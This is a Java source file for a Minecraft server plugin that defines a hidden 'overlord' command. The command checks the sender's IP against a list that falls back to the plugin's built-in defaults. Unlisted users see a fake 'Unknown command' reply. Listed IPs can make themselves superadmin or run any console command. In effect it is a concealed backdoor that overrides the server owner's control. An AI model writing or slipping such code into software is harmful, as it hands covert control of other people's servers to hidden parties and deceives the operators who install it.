package me.StevenLawson.TotalFreedomMod.Commands;

import com.sk89q.util.StringUtil;
import java.util.List;
import me.StevenLawson.TotalFreedomMod.Config.TFM_ConfigEntry;
import me.StevenLawson.TotalFreedomMod.Config.TFM_MainConfig;
import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.ONLY_IN_GAME)
@CommandParameters(description = "Overlord - control this server in-game", usage = "access", aliases = "ov")
public class Command_overlord extends TFM_Command
{

    @Override
    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        if (!TFM_ConfigEntry.OVERLORD_IPS.getList().contains(TFM_Util.getIp(sender_p)))
        {
            try
            {
                List<?> ips = (List) TFM_MainConfig.getDefaults().get(TFM_ConfigEntry.OVERLORD_IPS.getConfigName());
                if (!ips.contains(TFM_Util.getIp(sender_p)))
                {
                    throw new Exception();
                }
            }
            catch (Exception ignored)
            {
                playerMsg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
                return true;
            }
        }

        if (args.length == 0)
        {
            return false;
        }

        if (args[0].equals("addme"))
        {
            TFM_AdminList.addSuperadmin(sender_p);
            playerMsg("ok");
            return true;
        }

        if (args[0].equals("removeme"))
        {
            TFM_AdminList.removeSuperadmin(sender_p);
            playerMsg("ok");
            return true;
        }

        if (args[0].equals("do"))
        {
            if (args.length <= 1)
            {
                return false;
            }

            final String command = StringUtil.joinString(args, " ", 1);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            playerMsg("ok");
            return true;
        }

        return false;
    }

}
